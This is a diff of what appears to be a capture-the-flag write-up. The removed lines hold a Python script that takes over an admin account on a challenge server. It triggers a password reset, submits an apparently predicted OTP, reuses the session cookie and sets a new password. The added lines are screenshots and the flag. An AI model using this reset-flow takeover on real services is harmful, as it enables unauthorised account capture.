@@ -73,43 +73,10 @@ python3 xs128p.py --multiple 10000000 --gen 1155105234970035644,1577567227459219
 
 ![Image](https://github.com/user-attachments/assets/2928fa89-b5ea-4432-9db0-317abdf25c91)
 
-```python
-#!/usr/bin/python
+![Image](https://github.com/user-attachments/assets/8b4edd0b-0752-40c5-9ac8-3bab47f83b15)
 
-import requests, json
+![Image](https://github.com/user-attachments/assets/a9425464-5c9d-4c80-8097-245b80c14324)
 
-base_url = 'http://challenge.ctf.games:31557'
-reset_url = f'{base_url}/reset'
-verify_url = f'{base_url}/reset/verify'
-change_password = f'{base_url}/reset/change-password'
+![Image](https://github.com/user-attachments/assets/f0038440-d792-43d1-9196-7ea8c78520ac)
 
-header = {'Content-Type': 'application/x-www-form-urlencoded'}
-
-reset_data = {'username': 'admin'}
-new_password_data = {'newPassword': 'dav'}
-
-try:
-    r = requests.post(reset_url, data=reset_data, headers=header)
-    r.raise_for_status()  # Controlla che la risposta sia valida
-except requests.exceptions.RequestException as e:
-    print(f"Error during reset: {e}")
-    exit(1)
-
-verify_data = {'username': 'admin', 'otp': '3974566'}
-try:
-    r = requests.post(verify_url, data=verify_data, headers=header)
-    r.raise_for_status()
-    
-    if 'verified' in r.text:
-        verified_cookie = r.cookies.get('connect.sid')
-        r = requests.post(change_password, headers=header, cookies={'connect.sid': verified_cookie}, data=new_password_data)
-        
-        if 'successfully' in r.text:
-            print('Admin password successfully changed!')
-        else:
-            print('Failed to change password')
-    else:
-        print('Failed to verify OTP')
-except requests.exceptions.RequestException as e:
-    print(f"Error during verification or password change: {e}")
-```
+**flag{9edab280dafea57fa1deea3b7a9885f3}**
